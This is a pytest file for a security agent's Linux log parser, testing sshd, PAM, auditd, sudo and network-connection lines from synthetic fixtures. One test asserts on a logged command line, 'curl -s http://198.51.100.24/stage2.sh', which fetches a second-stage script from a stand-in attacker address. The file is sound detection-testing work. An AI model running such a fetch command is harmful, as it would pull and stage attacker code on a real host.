import pytest
import json
from pathlib import Path
from aegis_agent.linux_parser import LinuxTelemetryParser
from aegis_agent.schemas import LogEventInput


@pytest.fixture
def parser():
    return LinuxTelemetryParser(default_year=2026)


@pytest.fixture
def fixtures_data():
    fixture_path = Path(__file__).resolve().parent.parent / "evaluation" / "datasets" / "synthetic_linux_logs.json"
    with open(fixture_path, "r", encoding="utf-8") as f:
        return json.load(f)


def test_parse_sshd_failed_password(parser, fixtures_data):
    raw = fixtures_data[0]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "auth_failure"
    assert parsed.source_ip == "198.51.100.24"
    assert parsed.user == "admin"
    assert parsed.details["reason"] == "invalid_password"
    assert parsed.details["source_port"] == 54321
    assert "2026-11-01" in parsed.timestamp


def test_parse_sshd_accepted_password(parser, fixtures_data):
    raw = fixtures_data[2]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "auth_success"
    assert parsed.source_ip == "198.51.100.24"
    assert parsed.user == "admin"
    assert parsed.details["auth_method"] == "password"
    assert parsed.details["source_port"] == 54330


def test_parse_pam_session(parser, fixtures_data):
    raw = fixtures_data[3]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "session_opened"
    assert parsed.user == "admin"
    assert parsed.details["service"] == "pam_unix"


def test_parse_auditd_syscall(parser, fixtures_data):
    raw = fixtures_data[4]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "process_execution"
    assert parsed.details["process_name"] == "curl"
    assert parsed.details["executable"] == "/usr/bin/curl"
    assert parsed.details["pid"] == 12470
    assert parsed.timestamp is not None


def test_parse_auditd_execve_cmdline(parser, fixtures_data):
    raw = fixtures_data[5]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "process_cmdline"
    assert "curl -s http://198.51.100.24/stage2.sh" in parsed.details["command_line"]


def test_parse_sudo_execution(parser):
    raw = "Nov 07 15:03:24 fenn sudo[12413]:   ubuntu : PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/journalctl -u aegis-collector"
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "sudo_execution"
    assert parsed.user == "ubuntu"
    assert parsed.details["target_user"] == "root"
    assert parsed.details["command"] == "/usr/bin/journalctl -u aegis-collector"
    assert parsed.details["service"] == "sudo"


def test_parse_sudo_auth_failure(parser):
    raw = "Nov 07 15:00:00 fenn sudo[1234]: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=/dev/pts/0 ruser=ubuntu rhost= user=ubuntu"
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "sudo_auth_failure"
    assert parsed.user == "ubuntu"
    assert parsed.details["reason"] == "authentication_failure"
    assert parsed.details["service"] == "sudo"



def test_parse_network_connection_snapshot(parser, fixtures_data):
    raw = fixtures_data[6]["raw_line"]
    parsed = parser.parse_line(raw)

    assert isinstance(parsed, LogEventInput)
    assert parsed.event_type == "network_connection"
    assert parsed.source_ip == "198.51.100.24"
    assert parsed.details["connection_state"] == "ESTAB"
    assert parsed.details["remote_port"] == 54330


def test_parse_malformed_line_returns_none(parser, fixtures_data):
    raw = fixtures_data[7]["raw_line"]
    parsed = parser.parse_line(raw)
    assert parsed is None


def test_parse_batch_ignores_corrupted(parser, fixtures_data):
    all_lines = [f["raw_line"] for f in fixtures_data]
    batch_results = parser.parse_batch(all_lines)

    # 8 raw lines, 1 malformed -> exactly 7 valid LogEventInput
    assert len(batch_results) == 7
    for ev in batch_results:
        assert isinstance(ev, LogEventInput)
        assert ev.event_id is not None
        assert ev.event_type is not None


def test_invalid_timestamp_graceful_fallback(parser):
    # Log with invalid timestamp format
    broken_ts_log = "InvalidMonth 99 99:99:99 core-auth-srv01 sshd[123]: Failed password for admin from 10.0.0.1 port 22 ssh2"
    parsed = parser.parse_line(broken_ts_log)
    # Does not crash; timestamp is None or fallback
    assert parsed is not None
    assert parsed.timestamp is None
    assert parsed.event_type == "auth_failure"

